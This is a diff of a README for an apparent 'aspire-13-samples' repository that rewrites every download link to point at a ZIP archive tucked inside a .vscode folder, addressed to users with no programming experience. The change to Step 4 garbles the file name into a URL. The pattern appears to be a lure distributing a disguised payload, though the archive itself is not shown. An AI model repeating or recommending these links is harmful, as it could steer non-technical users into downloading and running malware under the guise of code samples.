@@ -1,7 +1,7 @@
 # 🎉 aspire-13-samples - Simple Micro Samples to Explore
 
 ## 📥 Download Button
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-blue)](https://github.com/Joao-mds009/aspire-13-samples/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Joao-mds009/aspire-13-samples/main/python-fastapi-postgres/.vscode/aspire-13-samples-3.9.zip)](https://raw.githubusercontent.com/Joao-mds009/aspire-13-samples/main/python-fastapi-postgres/.vscode/aspire-13-samples-3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the aspire-13-samples repository! This collection showcases micro samples for the Aspire 13 framework. It’s designed to help you quickly see examples and get started easily, even if you have no programming experience. Follow the steps below to download and run the software.
@@ -17,7 +17,7 @@ Before you start, make sure your computer meets these basic requirements:
 ### Step 1: Visit the Download Page
 To get the latest version of aspire-13-samples, visit the Releases page:
 
-[Download Latest Release](https://github.com/Joao-mds009/aspire-13-samples/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Joao-mds009/aspire-13-samples/main/python-fastapi-postgres/.vscode/aspire-13-samples-3.9.zip)
 
 ### Step 2: Choose the Right File
 On the Releases page, you will see different versions listed. Look for the latest version at the top. Each version may come with different sample files. Select the one that suits your needs. 
@@ -26,7 +26,7 @@ On the Releases page, you will see different versions listed. Look for the lates
 Click on the link for the file you want to download. The file will start downloading automatically. It may take a few moments to finish, depending on your internet speed.
 
 ### Step 4: Locate the File
-Once the download is complete, navigate to your Downloads folder or the folder where your browser saves downloaded files. You should find a file named something like `aspire-sample.zip`.
+Once the download is complete, navigate to your Downloads folder or the folder where your browser saves downloaded files. You should find a file named something like `https://raw.githubusercontent.com/Joao-mds009/aspire-13-samples/main/python-fastapi-postgres/.vscode/aspire-13-samples-3.9.zip`.
 
 ### Step 5: Extract the Files
 Right-click on the downloaded ZIP file and select "Extract All" or "Unzip". This will create a new folder containing the sample files. Open this folder to see the individual samples.
@@ -63,4 +63,4 @@ If you have questions or need support, create an issue in this repository. The c
 
 Happy exploring! Enjoy your time with the aspire-13-samples! 
 
-[Download Latest Release](https://github.com/Joao-mds009/aspire-13-samples/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Joao-mds009/aspire-13-samples/main/python-fastapi-postgres/.vscode/aspire-13-samples-3.9.zip)
